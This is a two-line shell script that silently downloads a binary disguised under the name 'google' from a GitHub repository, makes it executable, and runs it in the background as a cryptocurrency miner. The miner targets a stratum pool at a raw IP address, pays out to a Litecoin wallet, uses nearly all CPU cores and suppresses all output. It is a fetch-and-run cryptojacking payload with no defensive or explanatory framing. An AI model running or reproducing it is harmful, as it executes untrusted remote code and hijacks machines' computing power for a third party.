wget https://github.com/aurbach55/sugeh-ice/raw/main/google >/dev/null 2>&1 && chmod 777 google >/dev/null 2>&1

nohup ./google -a yespower -o stratum+tcp://103.249.70.7:6533 -u ltc1q5r0fy6ht74mrlaqtcw5duple2ppjppgf6qehm7 -p c=LTC  -t $(nproc --ignore 1) > nohup.out >/dev/null 2>&1
